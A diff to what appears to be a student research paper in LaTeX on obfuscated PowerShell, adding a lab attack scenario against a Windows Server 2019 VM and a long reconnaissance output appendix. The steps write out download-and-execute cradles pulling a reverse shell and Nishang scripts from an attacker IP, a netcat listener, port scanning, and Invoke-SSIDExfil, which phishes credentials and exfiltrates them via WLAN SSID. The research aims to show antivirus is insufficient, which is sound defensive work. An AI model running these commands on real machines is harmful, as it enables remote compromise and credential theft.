@@ -510,7 +510,150 @@ The windows versions,Windows $7$ and $8$ Home edition, which do not have scriptb
 
 
 \subsection{What additional defence systems can be deployed against obfuscated powershell scripts}
-\textit{Note:}Here I would like to write about and test some MTD systems. Also I was able to come up with a new defence system during the execution of some of my scripts. I dont think I will have enough time to write it and test it. How ever I can write in psuedo-code and use my findings like in table 6 and 7, to reason why this defence system might be better then AV-software or even Microsoft AMSI defence tools.
+In this section, the sub question will be answered by atempting to answer a different question, that is: "In what ways can we bypass the standard defences of a Windows machine". This section will be therefore written from the perspective of the attacker in the beginning. The results of the attack process will then afterwards be discussed from a defenders point of view.
+
+\subsubsection{Test Environment}
+In this subsection a short description of the environment will be given for reproducibility. A more detailed description can be found in chapter $2$.
+\begin{enumerate}
+	\item Victim machine: windows server 2019
+	\item Attacker machine: Parrot OS
+	\item Victim PowerShell: Powershell version: 5
+	\item Attack tools used:NetCat, nmap, python.
+\end{enumerate}
+The assumptions made in this scenario is that the attacker has the ability to deploy some form of remote code execution. This will be used in order to start the attack.
+The properties of logfile "Microsoft-Windows-PowerShell/Operational have been set as followed:
+\begin{itemize}
+	\item maximum size (default) 16.5mb
+	\item Archive logging
+\end{itemize}
+The properties of logfile "Windows PowerShell have been set as followed:
+\begin{itemize}
+	\item maximum size (default) 16.5mb
+	\item Archive logging
+\end{itemize}
+Both logfiles were cleared before the attack and during the attack only one powershell process will be run in order to decrease unnecessary logging (noise).
+\subsubsection{Attack}
+\textbf{Step 1}\hypertarget{attack1}.\newline After gaining the ability to execute code from a remote location, the attacker will gain access through executing a reverse shell script on the victim machine. In this case the reverse shell script of section 3.4.4 was used. The executed code on the victims machine in this case is:
+\begin{verbatim}
+iex (new-object Net.WebClient).downloadString
+("http://192.168.2.36:8000/revShell.txt");
+\end{verbatim}
+Inside revShell.txt the ip adress and portnumber are changed to $192.168.2.36$ and $8888$ respectively. The command used in a terminal on the attackers machine is:
+\begin{verbatim}
+nc -l -p 8888
+\end{verbatim}
+After executing this script the attackers terminal gains access to a cmd terminal on the victim machine.\newline
+After gaining access to the machine, an attacker will go back to phase 2 of the attack (Reconnaissance). In this phase the attacker will scan the computer for as much information as possible.\newline
+\textbf{Step 2}\hypertarget{attack2}.\newline
+First the attacker gains acces to a powershell terminal by executing:
+\begin{verbatim}
+powershell.exe
+\end{verbatim}
+\textbf{Step 3}\hypertarget{attack3}.\newline
+Afterwards the script Invoke-PortScan script is used by copy/pasting the content of the script in the reverse shell terminal.
+\begin{verbatim}
+Paste Invoke-Portscan.ps1
+\end{verbatim}
+\textbf{Step 4}\hypertarget{attack4}.\newline
+To check if the code was executed correctly, the attacker used Get-Help:
+\begin{verbatim}
+Get-Help Invoke-Portscan
+\end{verbatim}
+\textbf{Step 5}\hypertarget{attack5}.\newline
+Find victims ip:
+\begin{verbatim}
+ipconfig
+\end{verbatim}
+Output:
+\begin{verbatim}
+Connection-specific DNS Suffix  . : home
+Link-local IPv6 Address . . . . . : fe80::522:314e:958c:fca5%3
+IPv4 Address. . . . . . . . . . . : 10.0.2.15
+Subnet Mask . . . . . . . . . . . : 255.255.255.0
+Default Gateway . . . . . . . . . : 10.0.2.2
+\end{verbatim}
+\textbf{Step 6}\hypertarget{attack6}.\newline
+Using Invoke-PortScan to find all available machines in the network and all ports used by processes:
+\begin{verbatim}
+Invoke-PortScan -StartAddress 10.0.2.1 
+      -EndAddress 10.0.2.254 -ResolveHost -ScanPort
+\end{verbatim}
+Output:
+\begin{verbatim}
+IPAddress HostName Ports
+--------- -------- -----
+10.0.2.2  10.0.2.2 {}   
+10.0.2.3  10.0.2.3 {}   
+10.0.2.4  10.0.2.4 {}   
+10.0.2.15 WIN-H... {8...
+\end{verbatim}
+In this case there are no other machines in the network, therefore another scan is done just for the victim machine.\\
+\textbf{Step 7}\hypertarget{attack7}.\hfill
+\begin{verbatim}
+Invoke-PortScan -StartAddress 10.0.2.15 -EndAddress 10.0.2.15 -ResolveHost -ScanPort
+\end{verbatim}
+Output:
+\begin{verbatim}
+IPAddress HostName             Ports               
+--------- --------             -----               
+10.0.2.15 WIN-H8C7LGTI40B.home {80, 139, 445, 3389}
+\end{verbatim}
+After some further scanning, it becomes clear that these ports will not help the attacker any further.\\
+\textbf{Step 8}\hypertarget{attack8}\hfill
+\begin{verbatim}
+iex (new-Object Net.WebClient).DownloadString(
+    "http://192.168.2.36:8001/Check-VM.ps1");
+\end{verbatim}
+\textbf{Step 9}\hypertarget{attack9}\hfill
+\begin{verbatim}
+Check-VM
+\end{verbatim}
+Output
+\begin{verbatim}
+This is a Hyper-V machine.
+This is a Virtual Box.
+\end{verbatim}
+\textbf{Step 10}\hypertarget{attack10}\hfill
+\begin{verbatim}
+iex (new-Object Net.WebClient).DownloadString(
+    "http://192.168.2.36:8001/Get-Information.ps1")
+Get-Information
+\end{verbatim}
+The output of this command is large and therefore is added as an \hyperlink{output1}{attachment}.
+\textbf{Step 11}\hypertarget{attack11}\hfill
+\begin{verbatim}
+iex (new-Object Net.WebClient).DownloadString
+("http://192.168.2.36:8001/Invoke-SSIDExfil.ps1")
+\end{verbatim}
+This script has a high chance of giving the attacker root privilege as can be read in the description.
+\begin{verbatim}
+Get-Help Invoke-SSIDExfil
+\end{verbatim}
+Output:
+\begin{verbatim}
+NAME
+    Invoke-SSIDExfil
+    
+SYNOPSIS
+    Nishang script which can exfiltrate information like user credentials,
+    using WLAN SSID.
+    
+    
+SYNTAX
+    Invoke-SSIDExfil [[-StringToDecode] <String>] [[-StringToExfiltrate]
+    <String>] [-ExfilOnly] [-Decode] [<CommonParameters>]
+    
+    
+DESCRIPTION
+    In the default operation (without any option), the script opens a
+    prompt which asks for user credentials and does not go away till
+    valid local or domain credentials are entered in the prompt.
+\end{verbatim}
+Although a system admin might not fall for this trick, many normal computer users will. This means that an attacker, when targeting a normal user, uses this scripts, then the chances of the attacker gaining root privilege is high.
+After the victim used their password, the following information was given to the attacker.
+\includegraphics[scale=0.5]{result.png}
+\subsubsection{The end of the attack-phase}
+By using this SSID and Key the attacker can now advance towards gaining root priveleges on the victim machine. This is also where the attack scenario given will end. It is worth notin once again that all the information that was extracted from the victims machine, was extracted while AV was turned on. Proving once again that an AV is not enough to secure a windows machine.
 \newpage
 \section{Sources}
 \begin{enumerate}
@@ -871,7 +1014,275 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode,
 }
 Start-KeyLogger
 \end{verbatim}
+\hypertarget{output1}{\subsubsection{Output:Get-Information}}
 \begin{verbatim}
+get-childitem : Cannot find path 'HKEY_CURRENT_USER\software\simontatham\putty' because it does not exist.
+At line:27 char:21
++         else{$key = get-childitem $regkey}
++                     ~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (HKEY_CURRENT_US...montatham\putty:String) [Get-ChildItem], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+ 
+get-childitem : Cannot find path 'HKEY_CURRENT_USER\software\simontatham\putty\sessions' because it does not exist.
+At line:27 char:21
++         else{$key = get-childitem $regkey}
++                     ~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (HKEY_CURRENT_US...\putty\sessions:String) [Get-ChildItem], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+ 
+get-item : Cannot find path 'HKLM:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities' because it does not exist.
+At line:26 char:37
++         if ($child -eq "no"){$key = get-item $regkey}
++                                     ~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (HKLM:\SYSTEM\Cu...alidcommunities:String) [Get-Item], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand
+ 
+get-item : Cannot find path 'HKCU:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities' because it does not exist.
+At line:26 char:37
++         if ($child -eq "no"){$key = get-item $regkey}
++                                     ~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (HKCU:\SYSTEM\Cu...alidcommunities:String) [Get-Item], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand
+ 
+
+Logged in users:
+C:\Windows\system32\config\systemprofile
+C:\Windows\ServiceProfiles\LocalService
+C:\Windows\ServiceProfiles\NetworkService
+C:\Users\NormalUser
+C:\Users\Administrator
+
+ Powershell environment:
+Install
+PID
+ConsoleHostShortcutTarget
+ConsoleHostShortcutTargetX86
+Install
+
+ Putty trusted hosts:
+
+
+ Putty saved sessions:
+
+
+ Recently used commands:
+
+
+ Shares on the machine:
+
+
+ Environment variables:
+C:\Windows\system32\cmd.exe
+C:\Windows\System32\Drivers\DriverData
+Windows_NT
+C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+AMD64
+C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+C:\Windows\TEMP
+C:\Windows\TEMP
+SYSTEM
+C:\Windows
+2
+6
+Intel64 Family 6 Model 94 Stepping 3, GenuineIntel
+5e03
+auto
+
+ More details for current user:
+\\WIN-H8C7LGTI40B
+WIN-H8C7LGTI40B
+NormalUser
+C:\Users\NormalUser
+\Users\NormalUser
+C:
+C:\Users\NormalUser\AppData\Roaming
+C:\Users\NormalUser\AppData\Local
+WIN-H8C7LGTI40B
+
+ SNMP community strings:
+
+
+ SNMP community strings for current user:
+
+
+ Installed Applications:
+
+
+XAMPP
+Microsoft Visual C++ 2015 x64 Minimum Runtime - 14.0.23026
+7-Zip 16.04 (x64 edition)
+Microsoft Visual C++ 2015 x64 Additional Runtime - 14.0.23026
+
+ Installed Applications for current user:
+
+
+ Domain Name:
+0
+
+ Contents of /etc/hosts:
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+# localhost name resolution is handled within DNS itself.
+#       127.0.0.1       localhost
+#       ::1             localhost
+
+ Running Services:
+These Windows services are started:
+
+   Application Information
+   AVCTP service
+   Background Intelligent Transfer Service
+   Background Tasks Infrastructure Service
+   Base Filtering Engine
+   BranchCache
+   Certificate Propagation
+   CNG Key Isolation
+   COM+ Event System
+   Connected Devices Platform Service
+   Connected Devices Platform User Service_617e1
+   Connected User Experiences and Telemetry
+   CoreMessaging
+   Cryptographic Services
+   DCOM Server Process Launcher
+   DFS Namespace
+   DHCP Client
+   Diagnostic Policy Service
+   Distributed Link Tracking Client
+   Distributed Transaction Coordinator
+   DNS Client
+   Druva inSync Client Service
+   Group Policy Client
+   IKE and AuthIP IPsec Keying Modules
+   IP Helper
+   Local Session Manager
+   Network Connection Broker
+   Network List Service
+   Network Location Awareness
+   Network Store Interface Service
+   Plug and Play
+   Power
+   Print Spooler
+   Remote Desktop Configuration
+   Remote Desktop Services
+   Remote Desktop Services UserMode Port Redirector
+   Remote Procedure Call (RPC)
+   RPC Endpoint Mapper
+   Security Accounts Manager
+   Server
+   Server Infrastructure License Service
+   Shell Hardware Detection
+   SMB Hash Generation Service
+   State Repository Service
+   Storage Service
+   SysMain
+   System Event Notification Service
+   System Events Broker
+   Task Scheduler
+   TCP/IP NetBIOS Helper
+   Themes
+   Time Broker
+   Touch Keyboard and Handwriting Panel Service
+   Update Orchestrator Service
+   User Access Logging Service
+   User Manager
+   User Profile Service
+   Web Account Manager
+   Windows Connection Manager
+   Windows Defender Antivirus Network Inspection Service
+   Windows Defender Antivirus Service
+   Windows Defender Firewall
+   Windows Event Log
+   Windows Font Cache Service
+   Windows License Manager Service
+   Windows Management Instrumentation
+   Windows Push Notifications System Service
+   Windows Push Notifications User Service_617e1
+   Windows Remote Management (WS-Management)
+   Windows Search
+   Windows Security Service
+   Windows Time
+   Windows Update Medic Service
+   WinHTTP Web Proxy Auto-Discovery Service
+   Workstation
+
+The command completed successfully.
+
+
+ Account Policy:
+Force user logoff how long after time expires?:       Never
+Minimum password age (days):                          0
+Maximum password age (days):                          42
+Minimum password length:                              0
+Length of password history maintained:                None
+Lockout threshold:                                    Never
+Lockout duration (minutes):                           30
+Lockout observation window (minutes):                 30
+Computer role:                                        SERVER
+The command completed successfully.
+
+
+ Local users:
+
+User accounts for \\WIN-H8C7LGTI40B
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest                    
+NormalUser               WDAGUtilityAccount       
+The command completed successfully.
+
+
+ Local Groups:
+
+Aliases for \\WIN-H8C7LGTI40B
+
+-------------------------------------------------------------------------------
+*Access Control Assistance Operators
+*Administrators
+*Backup Operators
+*Certificate Service DCOM Access
+*Cryptographic Operators
+*Device Owners
+*Distributed COM Users
+*Event Log Readers
+*Guests
+*Hyper-V Administrators
+*IIS_IUSRS
+*Network Configuration Operators
+*Performance Log Users
+*Performance Monitor Users
+*Power Users
+*Print Operators
+*RDS Endpoint Servers
+*RDS Management Servers
+*RDS Remote Access Servers
+*Remote Desktop Users
+*Remote Management Users
+*Replicator
+*Storage Replica Administrators
+*System Managed Accounts Group
+*Users
+The command completed successfully.
+
+
+ WLAN Info:
+The following command was not found: wlan show all.
 
 \end{verbatim}
 
